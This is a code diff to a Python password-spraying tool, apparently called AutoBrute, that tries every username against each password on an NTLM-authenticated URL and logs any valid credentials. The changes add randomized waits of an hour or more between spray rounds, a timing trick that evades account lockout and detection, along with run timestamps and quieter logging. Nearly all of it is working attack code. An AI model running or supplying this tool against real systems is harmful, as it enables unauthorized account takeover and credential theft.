@@ -2,6 +2,7 @@
 
 import requests
 import difflib
+import random
 import sys
 import os
 import time
@@ -9,6 +10,8 @@ from requests_ntlm2 import HttpNtlmAuth
 from optparse import OptionParser
 from utils import messages
 from pathlib import Path
+from datetime import datetime
+from datetime import timedelta
 
 def sendrequest(url, username, password, domain, log):
     auth=HttpNtlmAuth("{}\\{}".format(domain, username), password)
@@ -43,6 +46,8 @@ def main():
     parser.add_option("-v", "--verbose", action="store_true", default=False, help="Verbose output. Show each individual test.")
     parser.add_option("-d", "--domain", help="NTLM domain. Required if using NTLM authentication.")
     parser.add_option("-o", "--outputdir", help="Output directory. Path where brute force attempts are stored.")
+    parser.add_option("--minwait", dest="minwait", default="3600", help="Minimum amount of time to wait between attempts (in seconds).")
+    parser.add_option("--maxwait", dest="maxwait", default="-1", help="Maximum amount of time to wait between attempts (in seconds). If this is specified, then a random wait between min and max will be chosen.")
     (options, args) = parser.parse_args()
 
     # Error parsing
@@ -83,6 +88,10 @@ def main():
         if p.exists() == False:
             os.makedirs(options.outputdir)
 
+    if not options.maxwait == "-1" and int(options.maxwait) <= int(options.minwait):
+        errors.append("Max wait time (seconds) must be greater than min wait time (seconds). e.g. --minwait 3600 --maxwait 7200")
+        errorfound = True
+        
     if errorfound:
         for msg in errors:
             log.error(msg, False)
@@ -91,6 +100,8 @@ def main():
 
     ## Main block
     #
+    opener = "AutoBrute Start Time: {}".format(datetime.now())
+    log.ok(opener)
     userfile = open(options.userfile, 'r').readlines() 
     passfile = open(options.passfile , 'r').readlines() 
     path_completed = options.outputdir + "/completed_passwords.txt"
@@ -115,6 +126,8 @@ def main():
     for pwd in master_list:
         pwd = pwd.strip('\n')
         outfile = open(options.outputdir + "/" + pwd + ".txt", 'w')
+        masterFound = False
+
         for user in userfile:
             user = user.strip('\n')
             resp = sendrequest(options.targeturl, user, pwd, options.domain, log)
@@ -123,15 +136,34 @@ def main():
 
             if isFound:
                 log.success(logoutput)
+                masterFound = True
             else:
-                log.error(logoutput, False)
+                if options.verbose:
+                    log.error(logoutput, False)
 
             outfile.write(logoutput + '\n')
             outfile.flush()
 
+        if masterFound == False:
+            output = "No valid creds for {}".format(pwd)
+            log.error(output, False)
+
+        if not options.maxwait == '-1':
+            # Get random wait time and sleep. Set waittime var
+            waittime = random.randint(int(options.minwait), int(options.maxwait)) 
+        else:
+            waittime = int(options.minwait)
+
         completed_pwds.write(pwd + '\n')
         completed_pwds.flush()
 
+        if pwd != master_list[-1]:
+            nextrun = datetime.now() + timedelta(seconds=int(waittime))
+            log.ok("Waiting {} seconds. Next run time: {}".format(waittime, nextrun))
+            time.sleep(waittime)
+
+    closer = "AutoBrute Finished Time: {}".format(datetime.now())
+    log.ok(closer)
 
 if __name__ == '__main__':
     main()
